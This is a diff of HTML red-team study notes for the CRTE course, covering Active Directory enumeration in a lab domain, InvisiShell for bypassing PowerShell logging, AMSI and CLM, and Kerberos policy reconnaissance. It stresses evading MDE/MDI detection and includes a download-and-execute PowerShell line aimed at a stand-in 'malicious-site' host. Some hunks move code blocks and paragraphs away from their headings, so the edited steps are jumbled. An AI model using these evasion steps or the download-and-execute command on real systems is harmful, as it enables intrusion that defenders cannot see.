@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRTE - Certified Red Team Expert - CRTE Study Notes</title>
+    <title>CRTE - Certified Red Team Expert</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
@@ -18,21 +18,23 @@
 <p>The enumeration phase in a Red Team engagement is where we gather as much information as possible about the target Active Directory (AD) environment. This phase is foundational because it helps us map out the domain structure, identify potential attack paths, and uncover high-value targets like privileged accounts or misconfigurations. Enumeration is a silent reconnaissance step that, when done effectively, can lead to a smoother and more efficient execution of later attack phases.</p>
 <h3>**Why is Enumeration Key in a Red Team Engagement?**</h3>
 <ol>
-<li>**Mapping the Environment**:</li>
-</ol>
+<li>
+<div class="li-header">**Mapping the Environment**:</div>
 <p>Active Directory environments can be complex, with numerous organizational units (OUs), users, groups, and policies. Enumeration helps you understand how these components interconnect. This map allows you to strategize your approach and identify where to focus your efforts.</p>
-<ol>
-<li>**Identifying Weak Points**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**Identifying Weak Points**:</div>
 <p>Misconfigurations in AD, such as overly permissive group memberships or improperly assigned privileges, often lead to privilege escalation opportunities. Enumeration allows you to pinpoint these weak spots.</p>
-<ol>
-<li>**Minimizing Noise**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**Minimizing Noise**:</div>
 <p>A well-conducted enumeration phase reduces the need for noisy exploitation attempts. By collecting and analyzing all relevant data early, you can design more precise attacks that are less likely to alert defenders.</p>
-<ol>
-<li>**Building Attack Paths**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**Building Attack Paths**:</div>
 <p>Enumeration is like connecting the dots. You start with basic data, such as user accounts and groups—and connect this information to find paths that lead to valuable assets, like Domain Admin credentials or sensitive file shares.</p>
+</li>
+</ol>
 <h3>**Key Goals of Enumeration**</h3>
 <ul>
 <li>**Discovering Domain Structure**: Learn about domain controllers, organizational units, and group policies.</li>
@@ -51,21 +53,23 @@
 <p>PowerShell is a natural choice for AD enumeration because it’s deeply integrated into Windows and widely used by administrators for legitimate tasks. This integration allows attackers to leverage PowerShell commands to gather information while blending in with regular activity.</p>
 <h3>**Choosing the Right Tool**</h3>
 <ol>
-<li>**Active Directory PowerShell Module**:</li>
-</ol>
+<li>
+<div class="li-header">**Active Directory PowerShell Module**:</div>
 <p>This module is the best choice for enumeration during a Red Team engagement because it is native to Windows, minimizes detection risk, and provides comprehensive functionality for querying AD. The commands executed with this module are considered normal administrative actions, making it less likely to be flagged by MDE or MDI.</p>
-<ol>
-<li>**PowerView**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**PowerView**:</div>
 <p>PowerView is a powerful script designed specifically for offensive enumeration, offering advanced capabilities such as ACL enumeration and group policy analysis. However, its use is often flagged by detection tools due to its aggressive behavior and known signatures. As a result, it is reserved for situations where native tools cannot achieve the desired results.</p>
-<ol>
-<li>**BloodHound**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**BloodHound**:</div>
 <p>BloodHound excels in analyzing relationships and attack paths in AD, but its data collection process can generate significant noise and is often flagged. It’s more suitable for post-enumeration analysis after data is collected using stealthier methods.</p>
-<ol>
-<li>**SharpView**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**SharpView**:</div>
 <p>SharpView provides similar functionality to PowerView but runs as a .NET binary, potentially bypassing certain PowerShell logging mechanisms. However, like PowerView, it’s best reserved for specific scenarios due to its detectability.</p>
+</li>
+</ol>
 <h3>**Avoiding Detection During Enumeration**</h3>
 <ol>
 <li>**Use Native Tools First**: Start with the Active Directory PowerShell Module to collect most of the information you need. Since these actions mimic legitimate administrator behavior, they are less likely to trigger alerts.</li>
@@ -78,69 +82,79 @@
 <ul>
 <li>Provides a clear understanding of the environment.</li>
 <li>Reduces the risk of failed attacks due to lack of knowledge.</li>
-<li>Helps you craft precise, low-noise attacks that are harder to detect.</li>
-</ul>
+<li>
+<div class="li-header">Helps you craft precise, low-noise attacks that are harder to detect.</div>
 <p>By using the right tools and techniques, you can gather all the information needed to execute your attack plan while staying under the radar. Throughout this course, the focus will be on using the Active Directory PowerShell Module for enumeration due to its stealth and efficiency, with PowerView being reserved for specialized scenarios where its unique features are indispensable.</p>
+</li>
+</ul>
 <h3>**Four Methods for AD Enumeration**</h3>
 <p>Here are the main tools used for domain enumeration in AD, their characteristics, and when to use them.</p>
 <h3>**1. Active Directory PowerShell Module**</h3>
 <ul>
-<li>**What is it?**</li>
-</ul>
+<li>
+<div class="li-header">**What is it?**</div>
 <p>A built-in Microsoft-supported PowerShell module designed for managing and enumerating AD environments. It includes cmdlets like `Get-ADUser`, `Get-ADGroup`, `Get-ADComputer`, and more.</p>
-<ul>
+</li>
 <li>**Advantages**:</li>
 <li>Native to Windows and doesn’t raise suspicion since it’s a legitimate administrative tool.</li>
 <li>Works seamlessly with MDE and MDI, provided commands are used sparingly and mimic legitimate administrator behavior.</li>
 <li>Logs less suspicious activity compared to custom scripts like PowerView.</li>
-<li>**Why Use It?**</li>
-</ul>
+<li>
+<div class="li-header">**Why Use It?**</div>
 <p>For most of the enumeration phase, **Active Directory PowerShell Module** will be our primary tool because it integrates natively, is harder to detect, and aligns with legitimate usage patterns.</p>
+</li>
+</ul>
 <h3>**2. BloodHound**</h3>
 <ul>
-<li>**What is it?**</li>
-</ul>
+<li>
+<div class="li-header">**What is it?**</div>
 <p>A graph-based tool that identifies relationships and potential attack paths in AD using data collected from tools like `SharpHound`.</p>
-<ul>
+</li>
 <li>**Advantages**:</li>
 <li>Provides a clear visual representation of privilege escalation paths.</li>
 <li>Excellent for identifying high-value targets and misconfigurations.</li>
 <li>**Limitations**:</li>
 <li>Data collection via `SharpHound` is noisy and often flagged by MDE/MDI.</li>
 <li>Not ideal during the initial stealthy enumeration phase.</li>
-<li>**When to Use It?**</li>
-</ul>
+<li>
+<div class="li-header">**When to Use It?**</div>
 <p>BloodHound is best for post-enumeration analysis after you've collected data covertly using other tools.</p>
+</li>
+</ul>
 <h3>**3. PowerView**</h3>
 <ul>
-<li>**What is it?**</li>
-</ul>
+<li>
+<div class="li-header">**What is it?**</div>
 <p>A PowerShell script that replicates many native AD enumeration tasks while adding more offensive-specific features.</p>
-<ul>
+</li>
 <li>**Advantages**:</li>
 <li>Comprehensive enumeration capabilities, including privilege enumeration, ACL analysis, and group policy analysis.</li>
 <li>Lightweight and script-based, making it flexible.</li>
 <li>**Limitations**:</li>
 <li>Highly detectable by MDE and MDI due to known signatures and behaviors.</li>
 <li>Execution may trigger alerts or blocklists on monitored systems.</li>
-<li>**Why Use It Sparingly?**</li>
-</ul>
+<li>
+<div class="li-header">**Why Use It Sparingly?**</div>
 <p>PowerView should only be used when native tools cannot accomplish the task or when stealth is less critical. Examples include analyzing ACLs (`Get-DomainACL`) or identifying group membership anomalies.</p>
+</li>
+</ul>
 <h3>**4. SharpView**</h3>
 <ul>
-<li>**What is it?**</li>
-</ul>
+<li>
+<div class="li-header">**What is it?**</div>
 <p>A .NET port of PowerView that offers the same functionality but executes as a compiled .NET assembly.</p>
-<ul>
+</li>
 <li>**Advantages**:</li>
 <li>Bypasses script block logging by running as a binary.</li>
 <li>Faster execution than PowerView.</li>
 <li>**Limitations**:</li>
 <li>Still detectable by modern AV/EDR solutions if signatures are known.</li>
 <li>Requires .NET runtime, which may not always be available.</li>
-<li>**When to Use It?**</li>
-</ul>
+<li>
+<div class="li-header">**When to Use It?**</div>
 <p>Similar to PowerView, SharpView should be reserved for specialized tasks or environments where PowerView is blocked.</p>
+</li>
+</ul>
 <h3>**Best Choice to Avoid MDE/MDI Detection**</h3>
 <p>For stealthy enumeration, **Active Directory PowerShell Module** is the best choice because:</p>
 <ol>
@@ -165,9 +179,11 @@
 <li>Enumeration is critical in understanding the AD environment and building effective attack paths.</li>
 <li>To maintain stealth, **Active Directory PowerShell Module** is the primary tool, as it blends with legitimate activity and avoids detection.</li>
 <li>**PowerView** and **SharpView** are fallback tools for advanced tasks but should be used sparingly to avoid detection.</li>
-<li>BloodHound is a powerful analysis tool but not suitable for initial enumeration due to its noisiness.</li>
-</ul>
+<li>
+<div class="li-header">BloodHound is a powerful analysis tool but not suitable for initial enumeration due to its noisiness.</div>
 <p>By sticking to native tools for enumeration, you reduce your footprint, increase stealth, and ensure a solid foundation for subsequent attack phases.</p>
+</li>
+</ul>
 <p>> **Note: BloodHound won’t be demonstrated in this guide.</p>
 <p>Througout the Labs I’ll be using ADModule and Powerview for enumeration, ADModule will always be our first option and Powerview will be used in some specific cases.**</p>
 <h1>PowerShell Security Control Bypass</h1>
@@ -196,71 +212,52 @@
 <li>**Modified Version**: The class uses a slightly modified version of InvisiShell.</li>
 <li>**Location of Tools**: All the tools, including InvisiShell, used in the lab environment are located in the `C:\AD` directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded.</li>
 <li>**InvisiShell and Binaries**: It is noted that binaries like `Rubeus.exe` may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt.</li>
-<li>**Example Usage**: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine.</li>
-</ul>
+<li>
+<div class="li-header">**Example Usage**: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine.</div>
 <p>In summary, **InvisiShell is essential for maintaining stealth in the lab environment** by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software.</p>
 <p>It’s always good that we do run Invisi-Shell via cmd before we start doing our enumeration and right after script execution, Powershell will be executed. This script should be executed depending on the type of privilege we do have on the machine.</p>
 <p>If we are just a simple low level privileged user, then we should run* *`RunWithRegistetyNonAdmin.ba``t``.`</p>
 <p>If we are a high level privileged user like Administrator for example, then we should run `RunWithPathAsAdmin.bat``.`</p>
 <p>`RunWithRegistryNonAdmin.bat`</p>
-<img src="./images/screenshot_53.png" alt="image" class="content-image">
+<img src="./images/screenshot_3.png" alt="image" class="content-image">
 <p>To verify whether **InvisiShell** has successfully bypassed the intended PowerShell defenses (e.g., logging mechanisms, AMSI, or other detection features), you can perform targeted tests to validate its effectiveness. Here's a step-by-step guide to check what defenses you were able to bypass and confirm whether InvisiShell is working properly:</p>
+</li>
+</ul>
 <h3>**1. Validate PowerShell Logging (Script Block Logging & Transcription)**</h3>
 <p>You can verify if **Script Block Logging** and **System-wide Transcription** are disabled or bypassed.</p>
 <h3>**Steps:**</h3>
-<ol>
-<li>**Script Block Logging Test**:</li>
-</ol>
+<pre><code class="language-powershell">[System.Net.Dns]::GetHostAddresses("example.com")</code></pre>
 <ul>
 <li>Execute a simple or obfuscated PowerShell command or script, such as:</li>
-</ul>
-<pre class="code-block"><code class="language-powershell">[System.Net.Dns]::GetHostAddresses("example.com")</code></pre>
-<ul>
 <li>Check the **Windows Event Log** under:</li>
 </ul>
-<pre class="code-block"><code class="language-plain text">Applications and Services Logs > Microsoft > Windows > PowerShell > Operational</code></pre>
-<ul>
-<li>If **InvisiShell** is working, no entries related to your script should appear in the event logs, even if Script Block Logging is enabled.</li>
-</ul>
-<ol>
-<li>**Transcription Test**:</li>
-</ol>
+<pre><code class="language-plain text">Applications and Services Logs > Microsoft > Windows > PowerShell > Operational</code></pre>
+<pre><code class="language-plain text">%USERPROFILE%\Documents\PowerShell_transcript</code></pre>
 <ul>
 <li>Look for transcription logs in the configured directory (defined by Group Policy or registry settings). By default, these logs might be stored in:</li>
-</ul>
-<pre class="code-block"><code class="language-plain text">%USERPROFILE%\Documents\PowerShell_transcript</code></pre>
-<ul>
 <li>If **InvisiShell** is bypassing transcription, there should be no logs created for your session.</li>
 </ul>
 <h3>**2. Validate AMSI Bypass**</h3>
 <p>AMSI scans the script content in memory before execution. You can confirm whether AMSI is disabled or bypassed.</p>
 <h3>**Steps:**</h3>
+<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')</code></pre>
 <ol>
 <li>Run a script known to trigger AMSI, such as one containing flagged keywords:</li>
-</ol>
-<pre class="code-block"><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')</code></pre>
-<ol>
 <li>Without InvisiShell, this should trigger an AMSI detection and display a warning like:</li>
 </ol>
-<pre class="code-block"><code class="language-plain text">This script contains malicious content and has been blocked by your antivirus software.</code></pre>
+<pre><code class="language-plain text">This script contains malicious content and has been blocked by your antivirus software.</code></pre>
+<h3>**3. Validate Constrained Language Mode (CLM)**</h3>
 <ol>
 <li>If **InvisiShell** is active and bypassing AMSI, the script should execute without any warning or blocking.</li>
 </ol>
-<h3>**3. Validate Constrained Language Mode (CLM)**</h3>
 <p>If CLM is enforced, it restricts advanced features like custom .NET assemblies and cmdlets.</p>
 <h3>**Steps:**</h3>
-<ol>
-<li>Check if CLM is enforced by running:</li>
-</ol>
-<pre class="code-block"><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode</code></pre>
+<pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode</code></pre>
 <ul>
 <li>**FullLanguage**: No CLM restrictions.</li>
 <li>**ConstrainedLanguage**: CLM is enforced.</li>
 </ul>
-<ol>
-<li>Try to execute a command that requires full language mode, such as:</li>
-</ol>
-<pre class="code-block"><code class="language-powershell">Add-Type -TypeDefinition 'public class Test { public string Hello() { return "Hello"; } }'</code></pre>
+<pre><code class="language-powershell">Add-Type -TypeDefinition 'public class Test { public string Hello() { return "Hello"; } }'</code></pre>
 <ul>
 <li>If CLM is bypassed, the command should succeed.</li>
 <li>If not, CLM is still enforced, and you'll see an error.</li>
@@ -268,23 +265,15 @@
 <h3>**4. Check Registry and Configurations**</h3>
 <p>InvisiShell relies on registry modifications and hooking into PowerShell processes.</p>
 <h3>**Steps:**</h3>
-<ol>
-<li>Verify Registry Modifications:</li>
-</ol>
+<pre><code class="language-plain text">HKEY_CURRENT_USER\Software\Classes\CLSID\<GUID>\InprocServer32</code></pre>
 <ul>
 <li>Check if the custom **COR_PROFILER** and related registry keys were added:</li>
-</ul>
-<pre class="code-block"><code class="language-plain text">HKEY_CURRENT_USER\Software\Classes\CLSID\<GUID>\InprocServer32</code></pre>
-<ul>
 <li>Confirm the custom profiler (e.g., `InShellProf.dll`) is loaded by inspecting the registry and the DLL path.</li>
 </ul>
-<ol>
-<li>Validate DLL Injection:</li>
-</ol>
+<h3>**5. Test Logging with a Known Detection Tool**</h3>
 <ul>
 <li>Use tools like **Process Explorer** or **Process Monitor** to check if the `InShellProf.dll` file is loaded into the PowerShell process.</li>
 </ul>
-<h3>**5. Test Logging with a Known Detection Tool**</h3>
 <p>To ensure that logging mechanisms (e.g., Script Block Logging or transcription) are bypassed:</p>
 <ul>
 <li>Use a test tool like **Sysmon** or a logging-enabled SIEM/EDR platform.</li>
@@ -292,16 +281,10 @@
 </ul>
 <h3>**6. Validate MDE/EDR Detection**</h3>
 <p>To check if InvisiShell bypasses **Microsoft Defender for Endpoint (MDE)** or another EDR:</p>
-<ol>
-<li>**Trigger a Common Red Team Command**:</li>
-</ol>
 <ul>
 <li>Execute a known enumeration command (e.g., querying AD groups or users) or a suspicious PowerShell command.</li>
 <li>Check if MDE raises any alerts in the **Microsoft Defender Security Center** or logs the action.</li>
 </ul>
-<ol>
-<li>**Analyze Process Activity**:</li>
-</ol>
 <ul>
 <li>Use **Sysinternals Process Monitor (ProcMon)** to see what happens when you run PowerShell commands. Look for:</li>
 <li>**Registry Queries**: Are logging settings being queried?</li>
@@ -318,13 +301,15 @@
 <li>If Script Block Logging and Transcription logs are empty after executing PowerShell commands, **InvisiShell successfully bypassed PowerShell logging mechanisms**.</li>
 <li>If AMSI does not block a script flagged as malicious, **InvisiShell bypassed AMSI**.</li>
 <li>If advanced commands execute despite CLM enforcement, **InvisiShell successfully bypassed CLM**.</li>
-<li>If your actions avoid detection by MDE or SIEM tools, **InvisiShell contributed to enhanced stealth**, but keep in mind:</li>
+<li>
+<div class="li-header">If your actions avoid detection by MDE or SIEM tools, **InvisiShell contributed to enhanced stealth**, but keep in mind:</div>
+<p>Now that we were able to execute our InvisiShell, let’s import ADModule for our enumeration.</p>
+</li>
 </ol>
+<h1>Importing Modules to Powershell.</h1>
 <ul>
 <li>Detection tools analyze behavior, not just logs. InvisiShell cannot fully bypass advanced behavior-based detection.</li>
 </ul>
-<p>Now that we were able to execute our InvisiShell, let’s import ADModule for our enumeration.</p>
-<h1>Importing Modules to Powershell.</h1>
 <p>For this module importing mechanism we do have 2 ways:</p>
 <p>Pay attention that dot sourcing with only work with extentions like `.ps1`, `.psd1` and the Import-Module with work with all the extentions like, `.ps1`, `.psd1`, `.dll`, and so on.</p>
 <p>1 - First option is using a dot sourcing mechanism.</p>
@@ -334,47 +319,47 @@
 <p>`Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll`</p>
 <p>`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`</p>
 <p>`Import-Module .\PowerView.ps1`</p>
-<img src="./images/screenshot_54.png" alt="image" class="content-image">
+<img src="./images/screenshot_4.png" alt="image" class="content-image">
 <p>On the screenshot above, it is possible to see that we used the 2 ways to import ADModule and PowerView as well.</p>
 <h3>**Enumerating Users, Computers and groups**</h3>
 <h3>User Enumeration</h3>
 <p>It is always import as an internal attacker that we start our enumeration by requesting a list of all the users within the company, this way we can have a better view of all the valid User Account in our domain. This list of users will really be important for us later on.</p>
 <p>`Get-ADUser -Filter *`</p>
-<img src="./images/screenshot_55.png" alt="image" class="content-image">
+<img src="./images/screenshot_5.png" alt="image" class="content-image">
 <p>As it’s possible to see, above we were able to grab the list of users, we have only 4 because the output is snip.</p>
 <p>Let’s say we want to have a full list of users only on the output and avoid any other property, is is possible by simply filtering for propertly SamAccountName for example, by piping the output and requesting only that specific property.</p>
 <p>`Get-ADUser -Filter * | Select -ExpandProperty samaccountname`</p>
-<img src="./images/screenshot_56.png" alt="image" class="content-image">
+<img src="./images/screenshot_6.png" alt="image" class="content-image">
 <p>As we can see, filtering by one specific property, gave us the possibility to bring only the full list of usernames. Other properties can be utilized the same when its needed.</p>
 <h3>Computer Enumeration</h3>
 <p>Our next step is to enumerate the computers in the domain and to achieve this command we can do the following as we did from our users enumeration.</p>
 <p>This request will help us to understand what type of computer we do have on the our targeted domain.</p>
 <p>We can simply request a full list of domain computers with all its properly:</p>
 <p>`Get-ADComputer -Fiter *`</p>
-<img src="./images/screenshot_57.png" alt="image" class="content-image">
+<img src="./images/screenshot_7.png" alt="image" class="content-image">
 <p>Above on the screenshot we do have the list of computers and it’s property in the domain. The list is SNIP since it brought with all the properties.</p>
 <p>We can also filter is and get just the full list of computer accounts on the output and save it as a list of computer for future used</p>
 <p>`Get-ADComputer -Fiter * | Select -expand name`</p>
-<img src="./images/screenshot_58.png" alt="image" class="content-image">
+<img src="./images/screenshot_8.png" alt="image" class="content-image">
 <p>We can see above that we were able to requets the full list of computers within the domain we are right now, in this case these are all the computer we have registered insde `us.techcorp.local` , which is a child domain of `techcorp.local`. We will discuss about **Parent/Child Relationship** later on.</p>
 <h3>Groups Enumeration</h3>
 <p>We can enumerate as well all the groups we have inside our target domain (`eu.techcorp.local`) by using the command `Get-ADGroup`.</p>
 <p>`Get-ADGroup -Filter *`</p>
-<img src="./images/screenshot_59.png" alt="image" class="content-image">
+<img src="./images/screenshot_9.png" alt="image" class="content-image">
 <p>As we did previously while enumerating Users and Computers, we can also filter to simply get a full list of all the users by filtering by the property `name`.</p>
 <p>`Get-ADGroup -Filter * | Select -Expand name`</p>
-<img src="./images/screenshot_60.png" alt="image" class="content-image">
+<img src="./images/screenshot_10.png" alt="image" class="content-image">
 <p>Now we do have a full list of all the groups inside `us.techcorp.local`.</p>
 <p>Now let’s move a bit further on this enumeration… Let’s imagine that we want to  go over one of the groups we just found inside the target domain and check the attributes of one specific group of our interest. For example, we can enumerate  `Domain Admins` Group by simply checking the group itself then we check its properties.</p>
 <p>`Get-ADGroup -Identity 'Domain Admins'`</p>
-<img src="./images/screenshot_61.png" alt="image" class="content-image">
+<img src="./images/screenshot_11.png" alt="image" class="content-image">
 <p>`Get-ADGroup -Identity 'Domain Admins' -Properties *`</p>
-<img src="./images/screenshot_62.png" alt="image" class="content-image">
+<img src="./images/screenshot_12.png" alt="image" class="content-image">
 <p>It is possible to see above that by checking the ‘Domain Admins’ group properties, it reveals lots of information, including also who is member of the ‘Domain Admins’ group.</p>
 <p>Let’s say now, we would like to know who are the member of a specific group, for example ‘`Domain Admins`’.</p>
 <p>We can use the command `Get-ADGroupMember` to achieve this task.</p>
 <p>`Get-ADGroupMember -Identity 'Domain Admins'`</p>
-<img src="./images/screenshot_63.png" alt="image" class="content-image">
+<img src="./images/screenshot_13.png" alt="image" class="content-image">
 <p>The output from our previous enumeration, confirms what we saw when we used the Get-ADGroup command to enumerate the ‘`Domain Admins`’ properties.</p>
 <p>Inside Domain Admins group we do have 2 users which are `Administrator` and `decda`.</p>
 <h3>Special Group</h3>
@@ -398,14 +383,16 @@
 <ul>
 <li>The **Enterprise Admins group** is the ultimate prize when targeting AD environments because of its forest-wide privileges.</li>
 <li>Enumerating this group provides a roadmap to identifying the most critical accounts in the environment.</li>
-<li>Once an Enterprise Admin is compromised, you essentially own the entire AD forest, enabling lateral movement, persistence, and complete control over the target network.</li>
-</ul>
+<li>
+<div class="li-header">Once an Enterprise Admin is compromised, you essentially own the entire AD forest, enabling lateral movement, persistence, and complete control over the target network.</div>
 <p>`Get-ADGroupMember -Identity 'Enterprise Admins'`</p>
-<img src="./images/screenshot_64.png" alt="image" class="content-image">
+<img src="./images/screenshot_14.png" alt="image" class="content-image">
 <p>The initial query failed because the **Enterprise Admins group** does not exist in the child domain (`us.techcorp.local`) being queried.</p>
 <p>By specifying the `-Server` parameter and pointing it to the **root domain** (`techcorp.local`), the command will direct the query to the correct location where the **Enterprise Admins group** resides, allowing the enumeration to succeed.</p>
 <p>`Get-ADGroupMember -Identity 'Enterprise Admins' -Server 'techcorp.local'`</p>
-<img src="./images/screenshot_65.png" alt="image" class="content-image">
+<img src="./images/screenshot_15.png" alt="image" class="content-image">
+</li>
+</ul>
 <h3>**Why Did the Query Work with **`Server`** and the Root Domain?**</h3>
 <ul>
 <li>**Specifying the Root Domain**:</li>
@@ -419,101 +406,61 @@
 <h3>Kerberos Policy Enumeration</h3>
 <p>Enumerating the **Kerberos policy** in an Active Directory environment is critical during a Red Team engagement for several reasons:</p>
 <ol>
-<li>**Understanding Ticket Behavior**:</li>
-</ol>
+<li>
+<div class="li-header">**Understanding Ticket Behavior**:</div>
 <p>Kerberos policies define how Kerberos tickets (TGTs and service tickets) behave in terms of lifespan, renewal, and clock synchronization. This information helps attackers understand the operational parameters of the target environment.</p>
-<ol>
-<li>**Identifying Weaknesses in Ticket Expiration**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**Identifying Weaknesses in Ticket Expiration**:</div>
 <p>Misconfigurations, such as overly long **MaxTicketAge** or **MaxRenewAge**, can provide opportunities for attacks like **Golden Ticket**, **Kerberoasting**, or session hijacking.</p>
-<ol>
-<li>**Facilitating Ticket Replay and Forgery Attacks**:</li>
-</ol>
+</li>
+<li>
+<div class="li-header">**Facilitating Ticket Replay and Forgery Attacks**:</div>
 <p>Attackers can leverage lax Kerberos policies to replay Kerberos tickets or forge them, exploiting weak enforcement of ticket expiration or clock skew.</p>
-<ol>
-<li>**Preparation for Persistence**:</li>
-</ol>
-<p>By understanding the ticket renewal policies and expiration, attackers can create **Golden Tickets** that align with the environment’s configuration, avoiding detection.</p>
+</li>
+<li>
+<div class="li-header">**Preparation for Persistence**:</div>
 <p>`(Get-DomainPolicy).KerberosPolicy`</p>
-<img src="./images/screenshot_66.png" alt="image" class="content-image">
+<img src="./images/screenshot_16.png" alt="image" class="content-image">
+<p>By understanding the ticket renewal policies and expiration, attackers can create **Golden Tickets** that align with the environment’s configuration, avoiding detection.</p>
+</li>
+</ol>
 <h3>**Explaining the Query Output**</h3>
 <p>Here’s the breakdown of the Kerberos policy parameters and their implications based on the screenshot:</p>
-<ol>
-<li>**MaxTicketAge**: `10`</li>
-</ol>
 <ul>
 <li>This specifies the maximum lifetime (in hours) of a Kerberos **Ticket Granting Ticket (TGT)**.</li>
 <li>**Implication**: A TGT issued by the Key Distribution Center (KDC) remains valid for 10 hours. Attackers can use stolen TGTs to impersonate a user within this time window. Longer durations increase the attacker's window for lateral movement.</li>
 </ul>
-<ol>
-<li>**MaxRenewAge**: `7`</li>
-</ol>
 <ul>
 <li>This indicates the maximum time (in days) for which a TGT can be renewed.</li>
 <li>**Implication**: Even if the initial TGT expires, it can be renewed for up to 7 days. Attackers with access to valid TGTs and renewal privileges can maintain persistence without generating new authentication events.</li>
 </ul>
-<ol>
-<li>**MaxServiceAge**: `600`</li>
-</ol>
 <ul>
 <li>The maximum lifetime (in minutes) of a **service ticket** issued by the KDC.</li>
 <li>**Implication**: Service tickets are valid for 10 hours (600 minutes), the same as TGTs. Attackers performing **Kerberoasting** may exploit this by capturing service tickets and cracking them offline during their validity.</li>
 </ul>
-<ol>
-<li>**MaxClockSkew**: `5`</li>
-</ol>
 <ul>
 <li>This represents the acceptable clock skew (in minutes) between the client and the server during Kerberos ticket validation.</li>
 <li>**Implication**: A clock skew of 5 minutes provides a small margin for time synchronization errors between systems. Attackers can exploit this for ticket replay attacks if their machine's time is synchronized within this range.</li>
 </ul>
-<ol>
-<li>**TicketValidateClient**: `1`</li>
-</ol>
 <ul>
 <li>This specifies whether the client’s identity is validated during service ticket requests.</li>
 <li>**Implication**: A value of `1` indicates that the client’s identity is validated. This strengthens the Kerberos authentication process, making it slightly harder for attackers to forge or misuse tickets without a valid client identity.</li>
 </ul>
 <h3>**Offensive Implications of This Output**</h3>
-<ol>
-<li>**Golden Ticket Creation**:</li>
-</ol>
-<ul>
-<li>Knowing the **MaxTicketAge** and **MaxRenewAge** allows attackers to craft Golden Tickets that align with the environment's ticket expiration policies, reducing the chance of detection.</li>
-</ul>
-<ol>
-<li>**Kerberoasting**:</li>
-</ol>
-<ul>
-<li>The **MaxServiceAge** parameter determines how long service tickets remain valid. Attackers can target long-lived service tickets for offline cracking.</li>
-</ul>
-<ol>
-<li>**Replay Attacks**:</li>
-</ol>
-<ul>
-<li>A **MaxClockSkew** of 5 minutes provides a limited window for replay attacks. However, synchronized clocks across systems can enable an attacker to exploit this margin effectively.</li>
-</ul>
-<ol>
-<li>**Persistence via Renewable TGTs**:</li>
-</ol>
-<ul>
-<li>Attackers with valid credentials can leverage **MaxRenewAge** to maintain long-term access by renewing their TGTs within the 7-day renewal window.</li>
-</ul>
-<ol>
-<li>**Detection of Misconfigurations**:</li>
-</ol>
-<ul>
-<li>Weak Kerberos configurations (e.g., unnecessarily long ticket lifetimes or renewal windows) provide insights into how to exploit the environment effectively.</li>
-</ul>
 <h3>**Key Takeaways**</h3>
 <ul>
+<li>Weak Kerberos configurations (e.g., unnecessarily long ticket lifetimes or renewal windows) provide insights into how to exploit the environment effectively.</li>
 <li>**Why Enumerate**: Understanding Kerberos policies helps attackers plan targeted attacks like Golden Ticket, Kerberoasting, or replay attacks while maximizing stealth and persistence.</li>
-<li>**Output Explained**:</li>
+<li>
+<div class="li-header">**Output Explained**:</div>
+<p>By analyzing Kerberos policies, attackers gain critical insights into ticket lifecycles and security configurations, which are essential for planning effective and stealthy attacks during Red Team engagements.</p>
+</li>
 <li>Tickets are valid for 10 hours and renewable for 7 days.</li>
 <li>Service tickets match the TGT validity, allowing extended exploitation opportunities.</li>
 <li>A 5-minute clock skew is acceptable, enabling time-sensitive attacks like replay if clocks are aligned.</li>
 <li>Client validation (enabled) adds a layer of difficulty to forging tickets.</li>
 </ul>
-<p>By analyzing Kerberos policies, attackers gain critical insights into ticket lifecycles and security configurations, which are essential for planning effective and stealthy attacks during Red Team engagements.</p>
 <h3>**Enumerating GPOs and OUs**</h3>
 <p>**What Are GPOs (Group Policy Objects)?**</p>
 <p>Group Policy Objects (GPOs) are a key feature in Microsoft Active Directory (AD) environments, used to define and enforce settings across computers and users in a domain.</p>
@@ -521,15 +468,17 @@
 <p>Enumerating Group Policy Objects (GPOs) with **PowerView** is often preferred over the **Active Directory PowerShell Module (ADModule)** during Red Team engagements because PowerView is designed with offensive security in mind, offering greater flexibility and specific enumeration features. Here's a detailed comparison to explain why **PowerView** is better suited for enumerating GPOs in such scenarios</p>
 <p>Since ADModule Lacks specialized commands for offensive enumeration, such as inspecting GPO permissions or extracting Restricted Groups directly, PowerView is better.</p>
 <p>`Get-DomainGPO`</p>
-<img src="./images/screenshot_67.png" alt="image" class="content-image">
+<img src="./images/screenshot_17.png" alt="image" class="content-image">
 <p>The Command Get-DomainGPO issued above, retrieves **all Group Policy Objects (GPOs)** in the domain and provide the following information:</p>
 <ul>
 <li>GPO Display Name.</li>
 <li>GUID (unique identifier).</li>
 <li>SYSVOL path for each GPO.</li>
-<li>Ownership and permissions for each GPO.</li>
-</ul>
+<li>
+<div class="li-header">Ownership and permissions for each GPO.</div>
 <p>But… We do have an issue here. This command will: `General enumeration of all GPOs, regardless of their specific settings` BUT `Does Not Include: Restricted Groups or their configurations`.</p>
+</li>
+</ul>
 <h3>**What Are Restricted Groups?**</h3>
 <p>**Restricted Groups** are a specific setting within GPOs that control the membership of groups on domain-joined machines. Administrators use Restricted Groups to ensure that specific users or groups are added to (or removed from) local groups like **Administrators**, **Remote Desktop Users**, or any custom groups on all domain-joined systems.</p>
 <h3>**Example**:</h3>
@@ -541,7 +490,7 @@
